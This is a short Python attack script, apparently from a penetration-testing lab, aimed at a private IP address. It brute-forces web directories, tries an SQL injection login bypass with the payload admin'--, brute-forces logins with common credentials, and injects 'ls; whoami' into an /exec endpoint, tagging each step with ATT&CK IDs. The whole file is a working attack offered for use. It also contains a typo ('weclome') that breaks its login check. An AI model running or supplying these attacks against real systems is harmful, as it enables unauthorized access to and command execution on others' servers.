import requests as re

base_url = "http://192.168.134.128"

def brute_force_directories(base_url, paths):
    print("Starting directory brute-forcing...")
    for path in paths:
        url = f"{base_url}/{path}"
        response = re.get(url)
        if response.status_code == 200:
            print(f"[+] Found accessible path: {url}")
        else:
            print(f"[-] {url} - Not accessible")

# sql Injection (T1190) Exlpoitaion
def sql_injection(base_url):
    print("Testing for SQL injection vulnerability (T1190)...")
    url = f"{base_url}/login"
    payload = {"username": "admin'--", "password": "password"}
    response = re.post(url, data=payload)

    if "welcome" in response.text.lower():
        print("[+] SQL Injection (T1190) successful with payload:", payload)
    else:
        print("[-] SQL Injection (T1190) failed.")

def brute_force_login(base_url, usernames, passwords):
    print("Starting brute-force login...")
    for username in usernames:
        for password in passwords:
            payload = {"username": username, "password": password}
            response = re.post(f"{base_url}/login", data=payload)
            if "weclome" in response.text.lower():
                print(f"[+] Successful login: {username}:{password}")
                return
            else:
                print(f"[-] Failed login: {username}:{password}")

# command_injection (T1059) Exploitation
def command_injection(base_url):
    print("Testing for Command Injection (T1059)...")
    url = f"{base_url}/exec"
    payload = {"cmd": "ls; whoami"}
    response = re.post(url, data=payload)

    if "root" in response.text or "user" in response.text:
        print("[+] Exploit: Command Injection (T1059) successful!")
    else:
        print("[-] Exploit: Command Injection (T1059) failed.")

paths = ["admin", "login", "test", "backup"]
usernames = ["admin", "user", "guest"]
passwords = ["12345", "password", "admin"]

brute_force_directories(base_url, paths)
sql_injection(base_url)
brute_force_login(base_url, usernames, passwords)
command_injection(base_url)
